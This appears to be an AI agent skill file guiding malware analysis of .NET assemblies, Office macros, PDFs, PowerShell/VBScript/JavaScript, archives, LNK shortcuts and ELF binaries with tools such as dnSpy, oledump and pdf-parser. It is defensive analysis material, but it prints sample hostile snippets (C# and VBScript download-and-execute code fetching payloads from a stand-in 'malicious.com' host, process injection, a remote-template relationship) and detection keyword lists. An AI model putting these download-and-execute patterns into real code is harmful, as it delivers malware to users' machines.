---
name: specialized-file-analyzer
description: Analyze specialized file types beyond standard PE executables - .NET assemblies, Office macros, PDFs, PowerShell scripts, JavaScript, archives, and Linux ELF binaries. Use when you encounter documents, scripts, or non-Windows executables that require format-specific analysis tools and techniques.
---

# Specialized File Analyzer

Expert analysis of non-PE file formats commonly used in malware campaigns: .NET, Office documents, PDFs, scripts, archives, and Linux binaries.

## When to Use This Skill

Use this skill when analyzing:
- **.NET/C# assemblies** (.exe, .dll with .NET framework)
- **Office documents** with macros (.docm, .xlsm, .doc, .xls)
- **PDF files** (suspicious attachments, exploit documents)
- **Scripts** (PowerShell .ps1, VBScript .vbs, JavaScript .js)
- **Archives** (.zip, .rar, .7z, .tar.gz)
- **Shortcuts** (.lnk files)
- **Linux binaries** (ELF executables)
- **Batch files** (.bat, .cmd)

**Key indicator:** `file` command shows non-PE32 executable or document type.

## Quick File Type Identification

```bash
# Identify file type
file sample.bin

# Common outputs:
# "PE32+ console executable, for MS Windows" → Standard PE (use malware-triage)
# "PE32 executable (GUI) Intel 80386 Mono/.Net assembly" → .NET (use this skill)
# "Microsoft Office Document" → Office macro (use this skill)
# "PDF document, version 1.7" → PDF (use this skill)
# "Zip archive data" → Archive (use this skill)
# "ELF 64-bit LSB executable" → Linux binary (use this skill)
# "ASCII text, with CRLF line terminators" → Script (use this skill)
```

---

## .NET / C# Assembly Analysis

### Detection
```bash
# Check for .NET assembly
file sample.exe | grep "Mono/.Net assembly"

# Or check strings
strings sample.exe | grep "mscoree.dll"

# Check PE header
pe-parser sample.exe | grep "CLR Runtime"
```

### Tool: dnSpy (Windows - Primary Tool)

**Download:** https://github.com/dnSpy/dnSpy

**Workflow:**
1. Open sample.exe in dnSpy
2. Navigate: Assembly Explorer → sample.exe → Namespace → Classes
3. Find entry point: Right-click assembly → Go to Entry Point

**What to Look For:**

**Main() Function:**
```csharp
// Entry point - start here
public static void Main(string[] args)
{
    // Analyze execution flow
}
```

**Suspicious Namespaces:**
- `System.Net` - Network operations (WebClient, HttpClient)
- `System.Security.Cryptography` - Encryption/decryption
- `System.Reflection` - Dynamic code loading
- `System.Diagnostics.Process` - Process execution
- `System.IO` - File operations
- `Microsoft.Win32` - Registry access

**Common Malicious Patterns:**
```csharp
// Download and execute
WebClient wc = new WebClient();
wc.DownloadFile("http://malicious.com/payload.exe", "C:\\temp\\payload.exe");
Process.Start("C:\\temp\\payload.exe");

// Base64 decode embedded payload
byte[] decoded = Convert.FromBase64String(encodedPayload);

// Reflective loading
Assembly.Load(byte[] rawAssembly);

// Process injection
WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesWritten);
```

**Extract Embedded Resources:**
```
Assembly Explorer → Right-click assembly → Resources
Look for:
- Embedded executables (byte arrays)
- Encrypted payloads
- Configuration data
- Icons (may hide data)

Right-click resource → Save
```

**Deobfuscation:**
```bash
# Using de4dot (automated deobfuscator)
de4dot sample.exe -o sample_deobfuscated.exe

# Handles common obfuscators:
# - ConfuserEx
# - .NET Reactor
# - Eazfuscator
# - Agile.NET
```

**Dynamic Debugging:**
```
dnSpy: Debug → Start Debugging (F5)
Set breakpoints on suspicious functions
Step through execution (F10/F11)
Watch variables and decrypted strings
```

### Tool: ILSpy (Cross-platform Alternative)

```bash
# Command-line decompilation
ilspycmd sample.exe -o output_directory/

# GUI version (Windows/Linux/Mac)
ilspy sample.exe
```

**Export decompiled code:**
```
File → Save Code → C# Project
```

### Analysis Checklist - .NET

- [ ] Entry point identified (Main function)
- [ ] Obfuscation detected and removed (if needed)
- [ ] Embedded resources extracted
- [ ] Network URLs/IPs extracted
- [ ] Crypto keys identified
- [ ] Anti-analysis checks found
- [ ] Payload execution method documented
- [ ] IOCs extracted (URLs, IPs, file paths)

---

## Office Document / Macro Analysis

### Detection
```bash
# Macro-enabled formats
# .docm, .xlsm, .pptm → Office 2007+ with macros
# .doc, .xls, .ppt → Legacy Office (97-2003) with macros

file document.docm
# Output: "Microsoft Word 2007+"

# Quick macro check
strings document.docm | grep -i "vba\|macro\|autoopen"
```

### Tool: oledump.py (Primary - Didier Stevens)

**Installation:**
```bash
wget https://didierstevens.com/files/software/oledump_V0_0_70.zip
unzip oledump_V0_0_70.zip
```

**Workflow:**

**1. List Streams:**
```bash
python oledump.py document.docm

# Example output:
#  1:       114 '\x01CompObj'
#  2:      4096 '\x05DocumentSummaryInformation'
#  3: M    8192 'Macros/VBA/ThisDocument'  ← Macro present (M indicator)
#  4: m    1024 'Macros/VBA/_VBA_PROJECT'
#  5: M    4096 'Macros/VBA/Module1'
```

**2. Extract Macro Code:**
```bash
# Extract macro from stream 3
python oledump.py -s 3 -v document.docm

# Decompress corrupted VBA
python oledump.py -s 3 --vbadecompresscorrupt document.docm

# Save to file
python oledump.py -s 3 -v document.docm > extracted_macro.vba
```

**3. Analyze Macro Code:**

Look for **Auto-Execution Functions:**
```vba
Sub AutoOpen()          ' Word - runs on document open
Sub Document_Open()     ' Word - runs on document open
Sub Workbook_Open()     ' Excel - runs on workbook open
Sub Auto_Open()         ' Excel - runs on workbook open
```

Look for **Suspicious VBA Functions:**
```vba
' Command execution
Shell("cmd.exe /c powershell ...")
CreateObject("WScript.Shell").Run "..."

' File download
CreateObject("MSXML2.XMLHTTP")
URLDownloadToFile ...

' File system operations
CreateObject("Scripting.FileSystemObject")

' Dynamic code execution
ExecuteStatement
Eval()
CallByName()
```

### Tool: olevba (oletools Suite)

**Installation:**
```bash
pip install oletools
```

**Automated Analysis:**
```bash
# Comprehensive analysis
olevba document.docm

# Decode obfuscated strings
olevba --decode document.docm

# JSON output for parsing
olevba -j document.docm > analysis.json

# Extract IOCs only
olevba --decode document.docm | grep -E "http|https|powershell|cmd|wscript"
```

**Output Interpretation:**
- **AutoExec** - Auto-execution keywords found
- **Suspicious** - Suspicious VBA keywords
- **IOCs** - URLs, IPs, file paths
- **Hex Strings** - Encoded data
- **Base64 Strings** - Encoded payloads
- **Dridex Strings** - Dridex malware indicators

### Excel 4.0 Macros (XLM Macros)

**More evasive than VBA macros!**

```bash
# Detect XLM macros
python oledump.py document.xls | grep XL

# Extract with XLMMacroDeobfuscator
git clone https://github.com/DissectMalware/XLMMacroDeobfuscator
python XLMMacroDeobfuscator.py -f document.xls

# Or use olevba
olevba document.xls --deobf
```

### Modern Office Documents (.docx, .xlsx) - No Macros

**Template Injection Attack:**
```bash
# Extract Office Open XML structure
unzip document.docx -d extracted/

# Check for external template
cat extracted/word/_rels/document.xml.rels | grep "http"

# Look for:
# <Relationship Type="http://schemas.../attachedTemplate"
#              Target="http://malicious.com/template.dotm" TargetMode="External"/>
```

**Embedded Objects:**
```bash
# Check for embedded files
ls extracted/word/embeddings/

# Analyze embedded objects
file extracted/word/embeddings/*
```

### Analysis Checklist - Office Documents

- [ ] Macro presence confirmed
- [ ] All macro streams extracted
- [ ] Auto-execution functions identified
- [ ] Obfuscated strings decoded
- [ ] Download URLs extracted
- [ ] Payload execution method documented
- [ ] External template checked (.docx/.xlsx)
- [ ] Embedded objects analyzed
- [ ] IOCs extracted and defanged

---

## PDF Analysis

### Detection
```bash
file document.pdf
# Output: "PDF document, version 1.7"
```

### Tool: pdfid.py (Didier Stevens)

**Quick Triage:**
```bash
python pdfid.py document.pdf

# Red flags:
# /OpenAction   - Executes action on open
# /AA           - Additional actions (auto-execute)
# /JavaScript   - Embedded JavaScript
# /JS           - JavaScript (short form)
# /Launch       - Launch external program
# /EmbeddedFile - Embedded files
# /RichMedia    - Flash/multimedia content
# /ObjStm       - Object streams (can hide malicious content)
```

**Example Output:**
```
PDFiD 0.2.7 document.pdf
 PDF Header: %PDF-1.7
 obj                   45
 endobj                45
 stream                12
 endstream             12
 /Page                  5
 /Encrypt               0
 /ObjStm                0
 /JS                    3  ← Suspicious!
 /JavaScript            2  ← Suspicious!
 /AA                    1  ← Auto-action present!
 /OpenAction            1  ← Executes on open!
 /Launch                0
 /EmbeddedFile          0
 /RichMedia             0
```

### Tool: pdf-parser.py (Didier Stevens)

**Extract JavaScript:**
```bash
# Search for JavaScript objects
python pdf-parser.py --search javascript document.pdf

# Extract specific object
python pdf-parser.py --object 15 document.pdf

# Dump JavaScript code
python pdf-parser.py --object 15 --raw document.pdf > extracted_js.txt

# Filter streams
python pdf-parser.py --filter document.pdf
```

### Tool: peepdf (Interactive Analysis)

```bash
# Install
pip install peepdf

# Interactive mode
peepdf -i document.pdf

# Commands in interactive shell:
> tree             # Show object structure
> object 15        # Inspect object 15
> stream 15        # View stream 15
> javascript       # Extract all JavaScript
> extract stream 15 > payload.bin
```

### PDF Exploits

**Common CVEs:**
- **CVE-2013-2729** - JavaScript heap spray
- **CVE-2010-0188** - libtiff buffer overflow
- **CVE-2009-0927** - JBIG2Decode heap overflow

**Shellcode Detection:**
```bash
# Look for shellcode in streams
python pdf-parser.py --raw --filter document.pdf | grep -E "(\x90{10}|\xeb)"

# Extract suspicious streams
python pdf-parser.py --object <id> --raw document.pdf | hexdump -C
```

### Analysis Checklist - PDF

- [ ] pdfid scan completed (flags identified)
- [ ] JavaScript extracted (if present)
- [ ] Embedded files extracted
- [ ] Auto-action mechanism documented
- [ ] Shellcode indicators checked
- [ ] CVE exploitation checked (if relevant)
- [ ] URLs/IPs extracted from JS
- [ ] IOCs documented

---

## PowerShell / Script Analysis

### PowerShell (.ps1) Deobfuscation

**Common Obfuscation Patterns:**

**Base64 Encoding:**
```powershell
# Encoded command execution
powershell.exe -EncodedCommand <base64_string>

# Decode manually
$encoded = "Base64StringHere"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

**String Concatenation:**
```powershell
$url = "ht" + "tp://" + "evil.com"
```

**Compression:**
```powershell
$ms = New-Object IO.MemoryStream
$ms.Write([Convert]::FromBase64String($compressed), 0, $compressedLength)
$ms.Seek(0,0) | Out-Null
$cs = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
```

### Tool: PSDecode

```bash
# Install
git clone https://github.com/R3MRUM/PSDecode

# Deobfuscate PowerShell
Import-Module .\PSDecode.ps1
PSDecode -InputFile malicious.ps1 -OutputFile decoded.txt
```

**Manual Analysis:**
```powershell
# Read script without executing
Get-Content malicious.ps1

# Search for key indicators
Select-String -Path malicious.ps1 -Pattern "Invoke-Expression|IEX|DownloadString|DownloadFile|FromBase64String"
```

**Suspicious PowerShell Patterns:**
- `Invoke-Expression` / `IEX` - Execute string as code
- `Invoke-WebRequest` / `Invoke-RestMethod` - Download content
- `DownloadString` / `DownloadFile` - Download payloads
- `FromBase64String` - Decode embedded payload
- `IO.Compression.GzipStream` - Decompress payload
- `Reflection.Assembly]::Load` - Load assembly from memory
- `-EncodedCommand` - Base64 encoded command
- `-WindowStyle Hidden` - Hide window
- `-ExecutionPolicy Bypass` - Bypass script execution policy

### VBScript (.vbs) Analysis

```vbs
' Common malicious patterns:

' Command execution
CreateObject("WScript.Shell").Run "cmd.exe /c ..."

' HTTP download
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", "http://malicious.com/payload.exe", False
objHTTP.Send

' File operations
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFile = objFSO.CreateTextFile("C:\payload.exe", True)

' Dynamic execution
Eval(encodedCode)
Execute(decodedPayload)
```

**Analysis:**
```bash
# Read script
cat malicious.vbs

# Search for patterns
grep -i "CreateObject\|WScript.Shell\|MSXML2.XMLHTTP\|Eval\|Execute" malicious.vbs

# Deobfuscate: Replace Eval() with WScript.Echo() to print instead of execute
```

### JavaScript (.js) Analysis

```bash
# Beautify obfuscated JS
cat malicious.js | js-beautify > beautified.js

# Online: https://beautifier.io/
```

**Suspicious Patterns:**
```javascript
// Code execution
eval(encodedCode);

// Decode strings
unescape("%75%6E%65%73%63%61%70%65");
decodeURIComponent("%20");

// ActiveX (Windows COM objects)
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c ...");

// WScript objects
var fso = new ActiveXObject("Scripting.FileSystemObject");
```

### Analysis Checklist - Scripts

- [ ] Script type identified (PS1, VBS, JS, BAT)
- [ ] Obfuscation detected and removed
- [ ] Base64/encoded strings decoded
- [ ] Download URLs extracted
- [ ] Execution commands documented
- [ ] Dropped file paths identified
- [ ] IOCs extracted (URLs, IPs, domains)

---

## Archive Analysis

### Safe Inspection (No Extraction)

```bash
# List contents without extracting
7z l archive.zip
unzip -l archive.zip
tar -tzf archive.tar.gz
rar l archive.rar

# Look for red flags:
# - Double extensions (invoice.pdf.exe)
# - Executable files (.exe, .scr, .com, .bat, .vbs)
# - LNK files (shortcuts)
# - Deeply nested archives (archive.zip -> archive2.zip -> payload.exe)
```

### Extract Safely

```bash
# Create isolated directory
mkdir /tmp/extracted_archive
cd /tmp/extracted_archive

# Extract
7z x ../archive.zip
unzip ../archive.zip
tar -xzf ../archive.tar.gz

# Immediately check file types
file *
```

### Password-Protected Archives

**Common passwords in malware:**
- `infected`
- `malware`
- `virus`
- `2024` / `2025`
- `123456`

```bash
# Extract with password
7z x -pinfected archive.zip
unzip -P infected archive.zip
```

### LNK (Shortcut) File Analysis

**Tool: LECmd (Windows)**
```powershell
# Download from: https://ericzimmerman.github.io/
LECmd.exe -f malicious.lnk
```

**Tool: lnkinfo (Linux)**
```bash
lnkinfo malicious.lnk

# Look for:
# - Target path (what it executes)
# - Command-line arguments
# - Working directory
# - Icon location (may reveal payload location)
```

**Manual Strings Analysis:**
```bash
strings malicious.lnk | grep -E "\.exe|\.dll|http|powershell|cmd"
```

### Analysis Checklist - Archives

- [ ] Contents listed without extraction
- [ ] File extensions verified (no double extensions)
- [ ] Files extracted to isolated directory
- [ ] All extracted files typed (file command)
- [ ] LNK files analyzed (if present)
- [ ] Nested archives checked
- [ ] Password documented (if applicable)

---

## Linux / ELF Binary Analysis

### Detection
```bash
file sample.bin
# Output: "ELF 64-bit LSB executable, x86-64"
```

### Static Analysis

**ELF Header:**
```bash
readelf -h sample.bin

# Shows:
# - Architecture (x86, x86-64, ARM)
# - Entry point address
# - Program header offset
# - Section header offset
```

**Sections:**
```bash
readelf -S sample.bin

# Look for suspicious sections:
# - High entropy sections (encrypted/packed)
# - Unusual section names
# - RWX sections (read-write-execute)
```

**Imported Libraries:**
```bash
ldd sample.bin

# Look for:
# - libssl.so (crypto/network)
# - libc.so (standard)
# - Unusual paths (/tmp/lib.so)
```

**Imported Symbols:**
```bash
nm -D sample.bin
objdump -T sample.bin

# Search for suspicious functions:
nm -D sample.bin | grep -E "socket|connect|fork|exec|ptrace|system"
```

**Strings:**
```bash
strings -a sample.bin | grep -E "http|/tmp|/etc|passwd"
```

### Dynamic Analysis (Linux)

**strace - System Call Monitoring:**
```bash
# Monitor all system calls
strace -f ./sample.bin 2>&1 | tee strace_output.txt

# Monitor specific calls
strace -e trace=network,file,process ./sample.bin

# File operations only
strace -e trace=open,read,write,close ./sample.bin

# Network operations only
strace -e trace=socket,connect,send,recv ./sample.bin
```

**ltrace - Library Call Monitoring:**
```bash
ltrace -f ./sample.bin 2>&1 | tee ltrace_output.txt
```

**Check for Packing:**
```bash
# UPX detection
readelf -S sample.bin | grep UPX

# Unpack UPX
upx -d sample.bin -o sample_unpacked.bin
```

### Analysis Checklist - ELF

- [ ] Architecture identified (x86/x64/ARM)
- [ ] Imported libraries documented
- [ ] Suspicious functions identified
- [ ] Packing detected and removed (if UPX)
- [ ] Strings extracted and analyzed
- [ ] System calls monitored (strace)
- [ ] Network activity captured
- [ ] File operations documented

---

## Integration with Report Writing

Each file type contributes specific sections to the malware analysis report:

**.NET Analysis** →
- Decompiled code snippets
- Embedded resource descriptions
- Obfuscation techniques used
- Reflective loading mechanisms

**Office Macros** →
- Macro code (sanitized)
- Auto-execution methods
- Download URLs
- Payload dropping process

**PDF Analysis** →
- Embedded JavaScript
- Auto-action triggers
- Exploit CVEs (if applicable)
- Shellcode presence

**Scripts** →
- Deobfuscated code
- Execution flow
- Download cradles
- C2 communications

**Archives/LNK** →
- Archive structure
- Masquerading techniques
- LNK target analysis
- Social engineering aspects

**ELF Binaries** →
- System calls used
- Network protocols
- Persistence mechanisms (cron, systemd)
- Rootkit indicators

---

## Tool Quick Reference

| File Type | Primary Tool | Secondary Tool |
|-----------|--------------|----------------|
| **.NET** | dnSpy | ILSpy, de4dot |
| **Office Macros** | oledump.py | olevba, XLMMacroDeobfuscator |
| **PDF** | pdfid.py, pdf-parser.py | peepdf |
| **PowerShell** | PSDecode | Manual analysis |
| **VBScript/JS** | Text editor + analysis | js-beautify |
| **Archives** | 7z, unzip, tar | - |
| **LNK** | LECmd (Win), lnkinfo (Linux) | strings |
| **ELF** | readelf, nm, objdump | strace, ltrace |

---

## Best Practices

**Do:**
- Always identify file type first (`file` command)
- Extract in isolated environments
- Document obfuscation techniques
- Save original and deobfuscated versions
- Test extracted IOCs for accuracy
- Cross-reference with VirusTotal/MalwareBazaar

**Don't:**
- Execute scripts without understanding them first
- Trust file extensions (check magic bytes)
- Skip deobfuscation steps
- Extract archives directly to important directories
- Assume password-protected = safe

---

## Example Usage

**User request:** "I have a suspicious .docm file with macros, help me analyze it"

**Workflow:**
1. Confirm file type (Office document)
2. Use oledump.py to list streams
3. Extract VBA macro code
4. Identify auto-execution functions
5. Decode obfuscated strings
6. Extract download URLs and IOCs
7. Document payload delivery method
8. Prepare findings for report
